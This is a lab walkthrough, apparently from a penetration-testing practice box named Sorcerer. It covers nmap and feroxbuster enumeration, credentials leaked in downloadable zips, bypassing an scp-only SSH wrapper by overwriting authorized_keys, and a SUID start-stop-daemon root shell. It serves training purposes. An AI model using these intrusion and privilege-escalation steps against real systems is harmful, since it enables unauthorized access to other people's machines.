---
icon: ubuntu
---

# Sorcerer - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.100 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 17:15 EDT
Nmap scan report for 192.168.194.100
Host is up (0.030s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      40470/udp   mountd
|   100005  1,2,3      44355/tcp   mountd
|   100021  1,3,4      43301/tcp   nlockmgr
|   100021  1,3,4      51802/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-title: Apache Tomcat/7.0.4
|_http-favicon: Apache Tomcat
37299/tcp open  mountd   1-3 (RPC #100005)
43301/tcp open  nlockmgr 1-4 (RPC #100021)
44355/tcp open  mountd   1-3 (RPC #100005)
45643/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   25.73 ms 192.168.45.1
2   25.66 ms 192.168.45.254
3   25.85 ms 192.168.251.1
4   26.88 ms 192.168.194.100
```

### <mark style="color:$primary;">HTTP Port 7742 TCP</mark>

<figure><img src="../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>

Upon visiting the page we are meet with a login form. Default creds do not work

#### Directory Busting

```
feroxbuster -u http://192.168.194.100:7742
```

<figure><img src="../../.gitbook/assets/image (645).png" alt=""><figcaption></figcaption></figure>

Feroxbuster discovers 2 interesting redirects

<figure><img src="../../.gitbook/assets/image (646).png" alt=""><figcaption></figcaption></figure>

I'll Download the Zip Files to my machine and check them out

<figure><img src="../../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>

Max looks to be the interesting target

```
unzip max.zip
```

<figure><img src="../../.gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>

we found some creds in the **`tomcat-users.xml.bak`** file

Further enumeration:

<figure><img src="../../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>

The error seems to be matching the scp\_wrapper.sh script located in his home directory

<figure><img src="../../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

Reviewing the authorized key, we can see upon attempting to ssh into the node, the scp\_wrapper.sh script is run. This then only allows commands that begin with scp to run. This is evident from the output of scp\_wrapper.sh, “case $SSH\_ORIGINAL\_COMMAND in ‘scp’ \*)

Since we can see scp is being used in this process, I wanted to attempt to modify the authorized key to avoid using the scp\_wrapper script and simply login using ssh. I modified the authorized\_keys file and removed all portions that called that script. You can see this below

<figure><img src="../../.gitbook/assets/image (653).png" alt=""><figcaption></figcaption></figure>

I then used scp to upload the modified authorized keys file from my local machine to the remote machine

```
scp -O -i .ssh/id_rsa .ssh/authorized_keys max@192.168.194.100:/home/max/.ssh/authorized_keys
```

<figure><img src="../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

Now we can ssh

<figure><img src="../../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

Quite a few users with a shell on this box

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SUID start-stop-daemon</mark>

Linpeas reveals an interesting SUID, upon checking out [GTFObins](https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid) we find an easy exploit&#x20;

<figure><img src="../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

```
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

<figure><img src="../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

And we have a shell as root!
